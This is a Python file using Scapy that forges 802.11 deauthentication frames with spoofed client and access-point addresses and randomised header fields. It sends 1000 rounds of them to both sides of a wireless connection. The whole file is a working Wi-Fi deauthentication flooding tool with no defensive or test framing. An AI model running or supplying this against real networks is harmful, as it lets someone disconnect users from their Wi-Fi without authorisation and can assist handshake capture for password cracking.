from scapy.all import *







# fc_field: order | protected | more data | powermgt | retry |  more frag | from_ds | to_ds


def fuzz_f(client,bssid,interface,random_p):
    if random_p==1:
        sc_field = 0b0000000000000000
        seq = random.getrandbits(12)      
        frag = random.getrandbits(4)       
        sc_field = (seq << 4) | frag
        duration = random.getrandbits(16)
        reason=random.getrandbits(4)
        time_s=random.uniform(0.001, 0.5)
        fcfield=(0b00<<2) | random.getrandbits(6)
    if random_p ==0:
        sc_field = 0b0000000000000000
        duration = 0b0000000000000000
        reason=0b0
        time_s=random.uniform(0.001, 0.5)
        fcfield=0b00000000

    dot11_to_AP = Dot11(ID=duration,addr1=client, addr2=bssid, addr3=bssid,FCfield=fcfield, SC=sc_field)
    dot11_to_cli = Dot11(ID=duration,addr1=bssid, addr2=client, addr3=bssid,FCfield=fcfield, SC=sc_field)
    deauth = Dot11Deauth(reason=reason)
    frame_to_AP = RadioTap()/dot11_to_AP/deauth
    frame_to_cli = RadioTap()/dot11_to_cli/deauth
    sendp(frame_to_AP, iface=interface, count=1,verbose=0)
    time.sleep(time_s)
    sendp(frame_to_cli, iface=interface,  count=1,verbose=0)
    time.sleep(time_s)



def deauth_f(client,bssid,interface,random_p):

    for i in range (1000):
        fuzz_f(client,bssid,interface,random_p)
        if i % 10 == 0 and i!=0:
            print(f"{i*2} frames sent")
   
     